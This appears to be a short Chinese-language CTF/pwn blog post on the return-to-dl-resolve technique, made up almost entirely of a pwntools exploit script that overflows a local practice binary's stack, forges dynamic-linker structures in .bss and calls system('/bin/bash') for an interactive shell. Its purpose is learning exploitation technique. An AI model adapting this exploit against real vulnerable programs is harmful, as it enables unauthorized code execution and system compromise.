---
layout:     post   			        # 使用的布局（不需要改）
title:      高阶rop之   			# 标题 
subtitle:   Return-to-dl-resolve浅析  			#副标题
date:       2019-08-26 				# 时间
author:     pic4xiu 		    		# 作者
header-img: img/post-bg-debug.png 		#这篇文章标题背景图片
catalog: true 					# 是否归档
tags:						#标签
    - pwn
---

感觉这个和rop没什么太大关系，主要是理解延迟绑定之类的东西，本篇主要参考**五千年木**大佬的[文章](https://www.cnblogs.com/elvirangel/p/8994799.html),并对最后exp作出了相对简洁的修改,下面写一下今天的收获

```
from pwn import*
p = process('./x86')
context.log_level = 'debug'
elf = ELF('./x86')
gift = 0x0804A040#bss

payload = 0x28*'a' + 4*'a'
payload +=  p32(elf.plt['read']) + p32(0x0804840B)#fun_addr
payload += p32(0) + p32(gift) + p32(17*4)

p.sendline(payload)

payload = ''
payload += p32(0x0804a00c) + p32(0x1e807)
payload += p32(0)+p32(0x1e44)
payload += p32(0) *4
payload += 'system\x00\x00'
payload += '/bin/bash\x00'
'''
	0x0804a00c
	0x1e807-------
	0            |
	0x1e44 <------
	0
	0
	0
	0
	syst
	em
	/bin/sh
'''
p.sendline(payload)

payload = 0x28*'a' + 4*'a'
payload += p32(0x080482D0) + p32(0x1da8) + p32(0xbeef) + p32(gift + 10*4)# system + rubbish + 'sh'
p.sendline(payload)

p.interactive()

#    0x80482d0:	push   DWORD PTR ds:0x804a004
```
